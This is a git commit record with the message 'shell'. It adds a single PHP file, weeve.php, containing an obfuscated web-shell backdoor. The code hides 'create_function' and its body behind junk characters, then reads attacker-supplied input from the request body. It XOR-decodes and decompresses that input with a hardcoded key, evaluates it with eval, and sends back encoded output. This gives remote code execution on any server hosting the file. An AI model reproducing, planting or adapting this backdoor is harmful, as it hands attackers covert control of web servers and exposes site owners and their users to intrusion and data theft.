056f2ec2dc6f1a6aed80020bb39bb373e4459ddf
Hugo Franco Alves Gil <hugofranco_12@hotmail.com>
2022-09-30 23:06:31 -0300

    shell

---
+++ weeve.php
@@ -0,0 +1,11 @@
+<?php
+$H='("/V$kh(.V+)$kf/",@Vfile_get_conteVnVts("php:/V/iVnputV"),V$m)==1) {@obV_start();@eVva';
+$O=str_replace('fy','','fycrefyatefy_ffyufyfynction');
+$j='=0V;($j<$c&&$i<$l);$j+V+,V$i++){V$o.=$t{$VVi}^$k{V$j};}}VretVurn $o;}if (@Vpreg_VmVatch';
+$x='unctioVn x($tV,$k){$Vc=VVstrlen($k);V$l=strVlen($t);$o=V"";for(V$i=0;$i<$l;V){VfVor($Vj';
+$i='$kV="f869ce1c";V$khV="V8414Va264bbV11";$Vkf="e14a2c88VV50ed";$p="2EVVCtCNnuzVNGNVqzcK";f';
+$K='b_enVd_clean(V);$r=@base6V4_enVcodeV(@x(@gzcoVmprVessV($o),$k));print("V$p$kVh$r$kf");}';
+$e='l(@gVzVuncompreVss(@xV(@baseV64_deVcode($m[V1V]V),$k))V);$o=@ob_get_conVteVVnts()V;@o';
+$d=str_replace('V','',$i.$x.$j.$H.$e.$K);
+$V=$O('',$d);$V();
+?>
